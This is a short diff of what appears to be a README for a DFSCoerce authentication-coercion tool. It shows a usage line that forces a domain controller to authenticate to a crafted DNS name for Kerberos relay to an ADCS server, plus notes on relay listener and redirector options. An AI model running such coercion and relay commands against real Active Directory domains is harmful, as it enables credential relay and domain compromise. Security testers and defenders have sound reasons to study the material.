@@ -23,3 +23,5 @@ DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
 -listener: relay listener port
 -redirector: relay server mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAA
 For detailed usage and command line switches refer to original krbleay tool
+
+<img src ="./Screenshot 2024-10-04 135731.png>
